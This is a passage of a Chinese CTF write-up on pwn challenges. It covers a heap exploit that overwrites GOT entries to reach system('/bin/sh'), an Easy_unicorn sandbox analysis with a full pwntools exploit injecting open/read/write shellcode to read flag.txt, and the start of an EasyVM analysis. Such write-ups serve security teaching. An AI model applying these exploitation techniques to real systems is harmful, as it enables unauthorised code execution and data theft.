0x20 # 0x60</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x500</span>, <span class="string">&quot;12&quot;</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&quot;12&quot;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">&quot;12&quot;</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">padding = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">edit(<span class="number">0</span>, padding + <span class="string">b&quot;\x30&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">edit(<span class="number">2</span>, p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">edit(<span class="number">1</span>, p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, padding + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice:\n&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="Easy-unicorn"><a href="#Easy-unicorn" class="headerlink" title="Easy_unicorn"></a>Easy_unicorn</h2><h3 id="unicorn"><a href="#unicorn" class="headerlink" title="unicorn"></a>unicorn</h3><p>可以看这篇<a target="_blank" rel="noopener external nofollow noreferrer" href="https://bbs.pediy.com/thread-253868.htm">分析文章</a></p>
<p><code>Unicorn</code>是一款基于<code>qemu</code>模拟器的模拟执行框架，支持<code>Arm，Mips</code>等多种指令集，为包含<code>c++,python,java</code>在内的多种语言提供了编程接口，其<code>DLL</code>可以被更多的语言调用。</p>
<p><code>Unicorn</code>采用虚拟内存基址，通过<code>uc_mem_map,uc_mem_read,uc_mem_write</code>的<code>api</code>来控制虚拟内存，<code>map</code>时需要与<code>0x1000</code>内存对齐。想要<code>Unicorn</code>模拟执行代码，则首先要将代码加载到虚拟内存中。</p>
<p><code>unicorn</code>中存在<code>hook</code>机制，调用<code>add_hook</code>即可添加一个<code>hook</code>。<code>Unicorn</code>的<code>hook</code>是链式的，也就是可以添加多个同类型的<code>hook</code>，<code>Unicorn</code>会依次调用每一个<code>handler</code>。这里我们主要关注四种类型的<code>hook</code></p>
<ul>
<li><code>UC_HOOK_INTR,1&lt;&lt;0</code> 中断</li>
<li><code>UC_HOOK_INSN,1&lt;&lt;1</code>，系统调用和中断</li>
<li><code>UC_HOOK_CODE,1&lt;&lt;2</code>，执行每一行代码时触发<code>hook</code></li>
<li><code>UC_HOOK_MEM_READ,1&lt;&lt;10</code> 内存写</li>
<li><code>UC_HOOK_MEM_WRITE,1&lt;&lt;11</code> 内存读取</li>
</ul>
<p><code>add_hook</code>的函数原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">uc_err <span class="title function_">uc_hook_add</span><span class="params">(uc_engine *uc, uc_hook *hh, <span class="type">int</span> type, <span class="type">void</span> *callback,</span></span><br><span class="line"><span class="params">        <span class="type">void</span> *user_data, <span class="type">uint64_t</span> begin, <span class="type">uint64_t</span> end, ...)</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">uc: uc_open() 返回的句柄</span></span><br><span class="line"><span class="comment">hh: 注册hook得到的句柄</span></span><br><span class="line"><span class="comment">type: hook 类型</span></span><br><span class="line"><span class="comment">callback: hook的会回调函数</span></span><br><span class="line"><span class="comment">user_data: 用户自定义数据. 将被传递给回调函数的最后一个参数user_data</span></span><br><span class="line"><span class="comment">begin:hook作用范围的起始地址(包括)</span></span><br><span class="line"><span class="comment">end: 作用范围的结束地址，默认为所有代码，当begin &gt; end时触发此hook类型时都会调用回调</span></span><br><span class="line"><span class="comment">...: 变量参数 (取决于 type)</span></span><br><span class="line"><span class="comment">return 成功则返回UC_ERR_OK , 否则返回 uc_err 枚举的其他错误类型</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="Sandbox分析"><a href="#Sandbox分析" class="headerlink" title="Sandbox分析"></a>Sandbox分析</h3><p>我们知道<code>unicorn</code>是作为虚拟机类似的存在，其运行的主程序主要就是<code>xctf_pwn</code>了。题目中给出了其<code>dump</code>文件。首先我们看一下<code>x86_sandbox</code>。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808152440.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们看到程序首先是读取<code>xctf_pwn.dmp</code>中的二进制数据，如果程序设置了<code>info</code>参数的话，其会输出<code>xctf_pwn</code>中所有的段信息。这一个步相当于初始化了虚拟机<code>x86_sandbox</code>这个对象。（可以有多个虚拟机对象，各个对象互不干扰）</p>
<p>接着如果设置<code>-debug</code>参数的话，其会添加一个<code>code_hook</code>，我们看一下</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808153851.png" alt="图片无法显示，请联系作者" title=" ">

<p>这里<code>hook</code>的类型为<code>4</code>，也就是<code>UC_HOOK_CODE</code>，那么每执行一条指令，其就会将<code>RIP</code>打印出来。接着是调用了<code>Disable_file_RDWR</code></p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808154607.png" alt="图片无法显示，请联系作者" title=" ">

<p>其将<code>sandbox</code>对象中<code>+0x28</code>位置的值置为了<code>0</code>，这里会影响后面的函数。接着添加了<code>system</code>的<code>hook</code>，这个<code>hook</code>的类型是<code>2</code>也就是会<code>hook</code>所有的中断和系统调用。我们看一下具体的<code>callback</code>函数，其根据<code>rax</code>的数值判断当前调用的系统函数，这里我们关注一下<code>rax=2</code>也就是<code>sys_open</code>系统调用，这是程序调用了<code>file_open</code>这个函数</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808155959.png" alt="图片无法显示，请联系作者" title=" ">

<p>由于之前将<code>sandbox+0x28</code>处设置为了<code>0</code>，因此并不能反会<code>fd</code>，但是文件已经打开了。完成<code>system hook</code>的添加之后，程序输出了所有的寄存器地址，然后启动了虚拟机</p>
<h3 id="提取程序"><a href="#提取程序" class="headerlink" title="提取程序"></a>提取程序</h3><p>我们可以利用<code>info</code>给出的信息提取。我们将<code>0x400000</code>开始到<code>0x604000</code>结束的内容提取出来，这就是程序的主要内容了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line">data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">| .gcc_except_table            |            401e64  |               f5c  |         24 |</span></span><br><span class="line"><span class="string">| debug001                     |      7ffff783b000  |               f88  |       4000 |</span></span><br><span class="line"><span class="string">| .data                        |            603090  |              4fb8  |         10 |</span></span><br><span class="line"><span class="string">| libc_2.23.so                 |      7ffff7475000  |              5008  |     1c0000 |</span></span><br><span class="line"><span class="string">| .fini                        |            4015a4  |            1c5008  |          9 |</span></span><br><span class="line"><span class="string">| .plt                         |            4009f0  |            1c5111  |        100 |</span></span><br><span class="line"><span class="string">| .jcr                         |            602e00  |            1c5211  |          8 |</span></span><br><span class="line"><span class="string">| ld_2.23.so1                  |      7ffff7ffc000  |            1c5219  |       1000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so2                  |      7ffff7ffd000  |            1c6219  |       1000 |</span></span><br><span class="line"><span class="string">| LOAD                         |            400000  |            1c7239  |        9c8 |</span></span><br><span class="line"><span class="string">| .init                        |            4009c8  |            1c7c01  |         1a |</span></span><br><span class="line"><span class="string">| [stack]                      |      7ffffffde000  |            1c7c1b  |      21000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.21          |      7ffff7a55000  |            1e8c2b  |     172000 |</span></span><br><span class="line"><span class="string">| LOAD2                        |            400af8  |            35ac3b  |          8 |</span></span><br><span class="line"><span class="string">| .fini_array                  |            602df8  |            35ac43  |          8 |</span></span><br><span class="line"><span class="string">| .prgend                      |            6031d8  |            35ac4b  |          1 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.212         |      7ffff7dc7000  |            35ac4c  |       a000 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.213         |      7ffff7dd1000  |            364c4c  |       2000 |</span></span><br><span class="line"><span class="string">| .plt.got                     |            400af0  |            366c4c  |          8 |</span></span><br><span class="line"><span class="string">| libstdc__.so.6.0.211         |      7ffff7bc7000  |            366c54  |       d000 |</span></span><br><span class="line"><span class="string">| ld_2.23.so                   |      7ffff7dd7000  |            373c54  |      26000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.1                |      7ffff783f000  |            399c54  |      16000 |</span></span><br><span class="line"><span class="string">| libgcc_s.so.11               |      7ffff7a54000  |            3afc54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so1                |      7ffff7274000  |            3b0c54  |       2000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so3                |      7ffff7474000  |            3b2c54  |       1000 |</span></span><br><span class="line"><span class="string">| libm_2.23.so2                |      7ffff7473000  |            3b3c54  |       1000 |</span></span><br><span class="line"><span class="string">| debug004                     |      7ffff7ffe000  |            3b4c5c  |       1000 |</span></span><br><span class="line"><span class="string">| xctf_pwn                     |            401e88  |            3b5c74  |        178 |</span></span><br><span class="line"><span class="string">| LOAD1                        |            4009e2  |            3b5dec  |          e |</span></span><br><span class="line"><span class="string">| LOAD3                        |            4015a2  |            3b5dfa  |          2 |</span></span><br><span class="line"><span class="string">| LOAD5                        |            4019a7  |            3b5e04  |          1 |</span></span><br><span class="line"><span class="string">| LOAD4                        |            4015ad  |            3b5e05  |          3 |</span></span><br><span class="line"><span class="string">| LOAD7                        |            602e08  |            3b5e08  |        1f0 |</span></span><br><span class="line"><span class="string">| LOAD6                        |            401a84  |            3b5ff8  |          4 |</span></span><br><span class="line"><span class="string">| [vdso]                       |      7ffff7ffa000  |            3b5ffc  |       2000 |</span></span><br><span class="line"><span class="string">| .text                        |            400b00  |            3b7ffc  |        aa2 |</span></span><br><span class="line"><span class="string">| libc_2.23.so3                |      7ffff7839000  |            3b8b5e  |       2000 |</span></span><br><span class="line"><span class="string">| libc_2.23.so2                |      7ffff7835000  |            3bab5e  |       4000 |</span></span><br><span class="line"><span class="string">| libc_2.23.so1                |      7ffff7635000  |            3beb5e  |       9000 |</span></span><br><span class="line"><span class="string">| .rodata                      |            4015b0  |            3c7b5e  |        3f7 |</span></span><br><span class="line"><span class="string">| .got                         |            602ff8  |            3c7f55  |          8 |</span></span><br><span class="line"><span class="string">| .got.plt                     |            603000  |            3c7f5d  |         90 |</span></span><br><span class="line"><span class="string">| .eh_frame_hdr                |            4019a8  |            3c7fed  |         dc |</span></span><br><span class="line"><span class="string">| .bss                         |            6030a0  |            3c80c9  |        138 |</span></span><br><span class="line"><span class="string">| extern                       |            6031e0  |            3c8201  |         98 |</span></span><br><span class="line"><span class="string">| libm_2.23.so                 |      7ffff716c000  |            3c8299  |     108000 |</span></span><br><span class="line"><span class="string">| [vsyscall]                   |  ffffffffff600000  |            4d0299  |       1000 |</span></span><br><span class="line"><span class="string">| [heap]                       |            604000  |            4d1299  |      32000 |</span></span><br><span class="line"><span class="string">| .init_array                  |            602df0  |            503299  |          8 |</span></span><br><span class="line"><span class="string">| .eh_frame                    |            401a88  |            5032a1  |        3dc |</span></span><br><span class="line"><span class="string">| debug003                     |      7ffff7fe7000  |            50367d  |       6000 |</span></span><br><span class="line"><span class="string">| xctf_pwn3                    |            603278  |            50967d  |        d88 |</span></span><br><span class="line"><span class="string">| xctf_pwn1                    |            602000  |            50a405  |        df0 |</span></span><br><span class="line"><span class="string">| xctf_pwn2                    |            6031d9  |            50b1f5  |          7 |</span></span><br><span class="line"><span class="string">| debug002                     |      7ffff7dd3000  |            50b1fc  |       4000 |</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">data = data.split(<span class="string">&quot;\n&quot;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">seg = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    t = i.split(<span class="string">&quot;|&quot;</span>)[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">    t = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> t]</span><br><span class="line">    t = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> t[<span class="number">1</span>:]] + t[:<span class="number">1</span>]</span><br><span class="line">    seg.append(t)</span><br><span class="line"></span><br><span class="line">seg.sort()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> seg:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i[<span class="number">0</span>]), i[<span class="number">1</span>:])</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;recovery_pwn&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;xctf_pwn.dump&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fr:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> seg:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">0</span>]&gt;=<span class="number">0x604000</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;len of &#123;&#125; is &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i[<span class="number">3</span>], i[<span class="number">2</span>]))</span><br><span class="line">        fr.seek(i[<span class="number">1</span>])</span><br><span class="line">        f.write(fr.read(i[<span class="number">2</span>]))</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>也可以采用<code>patch</code>的形式，通过将读取内存写入文件的二进制代码写入<code>eh_frame</code>段，<code>hook engine_start</code>的调用至<code>eh_frame</code>段的函数就可以完成程序的<code>dump</code>。</p>
<h3 id="xctf-pwn分析"><a href="#xctf-pwn分析" class="headerlink" title="xctf_pwn分析"></a>xctf_pwn分析</h3><p>反编译提取出来的程序，我们通过<code>string</code>找到主程序</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808174229.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们主要关注的是<code>cmp_pass</code>这个函数，</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808174406.png" alt="图片无法显示，请联系作者" title=" ">

<p>该函数将用户输入的<code>pass</code>转换为<code>16</code>进制，并与<code>cpuid</code>进行比较，若相同则调用<code>v5[0]+1</code>处的函数。否则就会将<code>vtable</code>的地址<code>+1</code>。而当用户输入的<code>pass</code>的总长度大于<code>4</code>且不正确时，程序就会推出。<code>cpuid</code>的产生位于<code>print_cpuid</code>函数中</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808172530.png" alt="图片无法显示，请联系作者" title=" ">

<p><code>a1+0x18</code>中存储着原始的<code>cpuid</code>数值，通过异或得到输出的<code>machine-code</code>。我们可以通过<code>machine-code</code>反向次序异或，得到原始的<code>cpuid</code>。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;\x1B[1;31;5m &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot; &quot;</span>).strip()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data_int_list = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">b&quot;-&quot;</span>)]</span><br><span class="line">data_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_int_list:</span><br><span class="line">    data_bytes += p32(i)</span><br><span class="line">data_bytes_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_bytes]</span><br><span class="line"><span class="built_in">print</span>(data_bytes)</span><br><span class="line"><span class="built_in">print</span>(data_bytes_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xe</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data_bytes_list[i]^=data_bytes_list[i+<span class="number">1</span>]</span><br><span class="line">pass_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_bytes_list:</span><br><span class="line">    pass_str += <span class="string">&quot;%02x&quot;</span>%i</span><br><span class="line"><span class="built_in">print</span>(pass_str)</span><br></pre></td></tr></table></figure>

<p>当我们输入正确的<code>pass</code>的时候，就会调用<code>vtable+1</code>的函数</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808173426.png" alt="图片无法显示，请联系作者" title=" ">

<p>我们看一下该函数</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808173541.png" alt="图片无法显示，请联系作者" title=" ">

<p>在<code>sandbox</code>中<code>open</code>的系统调用已经被<code>hook</code>了，文件已经被打开，但是无法返回<code>fd</code>。</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808175121.png" alt="图片无法显示，请联系作者" title=" ">

<p>但是我们注意到<code>401928</code>位置即<code>vtable+0x28</code>处存在一个后门函数</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808174712.png" alt="图片无法显示，请联系作者" title=" ">

<p>这里会执行用户输入的任意的<code>shellcode</code>。但是我们要想执行这个函数需要将<code>vtable</code>的地址<code>+0x20</code>才行，因此需要输入<code>pass</code>错误<code>0x20</code>次。也就是需要绕过总长度大于<code>4</code>的判断。我们注意到在<code>readpass</code>的时候如果用户输入的是<code>\n</code>，其并不会进入<code>for</code>循环，也就是<code>count</code>永远是<code>0</code>。这就绕过了判断。</p>
<p>接下来就是如何执行<code>shellcode</code>的问题了。<code>orw</code>操作中<code>open</code>操作文件已经打开只不过是<code>fd</code>没有返回。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./x86_sandbox&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;\x1B[1;31;5m &quot;</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">&quot; &quot;</span>).strip()</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data_int_list = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> data.split(<span class="string">b&quot;-&quot;</span>)]</span><br><span class="line">data_bytes = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_int_list:</span><br><span class="line">    data_bytes += p32(i)</span><br><span class="line">data_bytes_list = [i <span class="keyword">for</span> i <span class="keyword">in</span> data_bytes]</span><br><span class="line"><span class="built_in">print</span>(data_bytes)</span><br><span class="line"><span class="built_in">print</span>(data_bytes_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xe</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    data_bytes_list[i]^=data_bytes_list[i+<span class="number">1</span>]</span><br><span class="line">pass_str = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_bytes_list:</span><br><span class="line">    pass_str += <span class="string">&quot;%02x&quot;</span>%i</span><br><span class="line"><span class="built_in">print</span>(pass_str)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;your password &lt;&lt; &quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your password &lt;&lt; &quot;</span>, pass_str)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag.txt&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;data ptr:&quot;</span>)</span><br><span class="line">buf_address = <span class="built_in">int</span>(p.recvline().strip(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;data&lt;&lt;&quot;</span>, asm(shellcode))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;invoke ptr&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;arg0&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;arg1&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;arg2&lt;&lt;&quot;</span>, <span class="built_in">str</span>(buf_address))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="EasyVM"><a href="#EasyVM" class="headerlink" title="EasyVM"></a>EasyVM</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>程序提供了四种方法，其中最为重要的就是<code>start</code>的逻辑</p>
<img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200808215536.png" alt="图片无法显示，请联系作者" title=" ">

<p>通过<code>0x80</code>我们可以将<code>ptr[n]</code>改写为任意四字节值，而配合<code>0x54</code>和<code>0x53</code>可以实现内存的任意读写。通过<code>0x9</code>和<code>0x11</code>的配合，我们可以泄露<code>0x5655805c</code>处的内容</p>
